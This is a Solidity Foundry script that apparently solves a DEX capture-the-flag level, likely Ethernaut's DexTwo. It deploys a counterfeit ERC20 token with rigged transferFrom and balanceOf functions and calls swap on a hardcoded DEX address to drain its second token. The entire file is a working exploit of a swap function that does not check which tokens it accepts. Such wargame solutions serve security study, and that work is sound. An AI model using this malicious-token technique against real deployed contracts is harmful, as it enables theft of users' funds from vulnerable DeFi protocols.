/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint256 amount) external;
}

contract FakeToken is ERC20 {
    constructor() ERC20("FakeToken", "FAKE") {
        address dex = 0xb37818dE6B736F7144Ad172742772fd9BbD9c61D;
        _mint(dex, 10);
    }

    function transferFrom(
        address,
        address,
        uint256 amount
    ) public override returns (bool) {
        transfer(tx.origin, amount);
        return true;
    }

    function balanceOf(address) public pure override returns (uint256) {
        return 10;
    }
}

contract DexTwo is Script {
    function run() public {
        vm.startBroadcast();

        FakeToken fakeToken = new FakeToken();
        IDexTwo dexTwo = IDexTwo(0xb37818dE6B736F7144Ad172742772fd9BbD9c61D);
        // address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();
        // dexTwo.swap(address(fakeToken), token1, 10);
        dexTwo.swap(address(fakeToken), token2, 10);

        vm.stopBroadcast();
    }
}
